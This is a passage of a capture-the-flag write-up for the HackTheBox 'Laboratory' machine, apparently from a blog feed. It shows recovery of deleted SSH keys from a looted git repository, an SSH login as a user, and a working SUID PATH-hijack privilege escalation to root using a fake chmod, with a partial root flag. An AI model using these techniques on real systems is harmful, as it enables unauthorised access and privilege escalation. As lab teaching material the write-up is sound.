</span></span><span class="line"><span class="cl">$ tar -xzf exfil-securedocker-git.tar
</span></span><span class="line"><span class="cl">→ root@iamf «loot» «10.10.14.39»
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> 19581e27de7ced....5ef03f7c3017bb5b7.git
</span></span><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ 
</span></span></code></pre></div><p>But, when I try to read the repository status, it returns the following errors.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «19581e27de7ced....5ef03f7c3017bb5b7.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><blockquote>
<p>I&rsquo;ve renamed <code>19581e27de7ced00ff1ce50b2047e7a567c76b1cbaebabe5ef03f7c3017bb5b7.git</code> to <code>secure-docker.git</code>.</p>
</blockquote>
<p>This problem can be resolved by creating a new <code>.git</code> folder within <code>secure-docker.git</code> and transferring all the files from <code>secure-docker.git</code> to the newly created <code>.git</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mkdir .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ mv * .git
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">fatal: this operation must be run in a work tree
</span></span></code></pre></div><p>Finally, use the <code>git init</code> command to re-initialize the git repository.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span>
</span></span><span class="line"><span class="cl">$ git init
</span></span><span class="line"><span class="cl">Reinitialized existing Git repository in /root/htb/to-do/laboratory/loot/secure-docker.git/.git/
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git status
</span></span><span class="line"><span class="cl">On branch master
</span></span><span class="line"><span class="cl">Changes to be committed:
</span></span><span class="line"><span class="cl">  <span class="o">(</span>use <span class="s2">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span class="o">)</span>
</span></span><span class="line"><span class="cl">        deleted:    README.md
</span></span><span class="line"><span class="cl">        deleted:    create_gitlab.sh
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">        deleted:    dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">        deleted:    dexter/recipe.url
</span></span><span class="line"><span class="cl">        deleted:    dexter/todo.txt
</span></span></code></pre></div><p>This repository contains a set of SSH keys that have been deleted. I can restore these with <code>git checkout --</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ git checkout --
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 ..
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">102</span> Mar <span class="m">22</span> 09:36 recipe.url
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 09:36 .ssh
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root  <span class="m">160</span> Mar <span class="m">22</span> 09:36 todo.txt
</span></span></code></pre></div><h4 id="ssh---dexter">SSH - dexter</h4>
<p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
<p>At first try, it says the key is invalid format, but this can be fixed wit by adding an empty string (newline) using the <code>echo</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> dexter/.ssh/id_rsa
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">Load key <span class="s2">&#34;id_rsa&#34;</span>: invalid format
</span></span><span class="line"><span class="cl">dexter@10.10.10.216: Permission denied <span class="o">(</span>publickey<span class="o">)</span>.
</span></span><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
</span></span></code></pre></div><p>Now it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ ssh -i id_rsa dexter@10.10.10.216
</span></span><span class="line"><span class="cl">dexter@laboratory:~$
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ id<span class="p">;</span>hostname
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>dexter<span class="o">)</span>
</span></span><span class="line"><span class="cl">laboratory
</span></span><span class="line"><span class="cl">dexter@laboratory:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r--r----- <span class="m">1</span> root dexter <span class="m">33</span> Mar <span class="m">22</span> 10:06 user.txt
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span class="o">(</span>master<span class="o">)</span> ✗
</span></span><span class="line"><span class="cl">$ cat dexter/todo.txt
</span></span><span class="line"><span class="cl"><span class="c1"># DONE: Secure docker for regular users</span>
</span></span><span class="line"><span class="cl"><span class="c1">### DONE: Automate docker security on startup</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Look into &#34;docker compose&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># TODO: Permanently ban DeeDee from lab#</span>
</span></span></code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root   dexter           17K Aug <span class="m">28</span>  <span class="m">2020</span> /usr/local/bin/docker-security
</span></span></code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command reveals that it uses relative path to call <code>chmod</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ ltrace docker-security 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">setuid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">setgid<span class="o">(</span>0<span class="o">)</span>                                                                                                <span class="o">=</span> -1
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span class="s1">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">system<span class="o">(</span><span class="s2">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span class="s1">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
</span></span><span class="line"><span class="cl"> &lt;no <span class="k">return</span> ...&gt;
</span></span><span class="line"><span class="cl">--- SIGCHLD <span class="o">(</span>Child exited<span class="o">)</span> ---
</span></span><span class="line"><span class="cl">&lt;... system resumed&gt; <span class="o">)</span>                                                                                   <span class="o">=</span> <span class="m">256</span>
</span></span><span class="line"><span class="cl">+++ exited <span class="o">(</span>status 0<span class="o">)</span> +++
</span></span></code></pre></div><p>Knowing this, I could hijack the execution path.</p>
<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:~$ <span class="nb">cd</span> /dev/shm
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
</span></span></code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it points to my <code>chmod</code> on <code>/dev/shm</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
</span></span><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ which chmod
</span></span><span class="line"><span class="cl">/dev/shm/chmod
</span></span></code></pre></div><p>And now I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">dexter@laboratory:/dev/shm$ docker-security 
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm#
</span></span><span class="line"><span class="cl">root@laboratory:/dev/shm# cut -c6- /root/root.txt 
</span></span><span class="line"><span class="cl">9f593f335a0a1f403c753719eb6
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
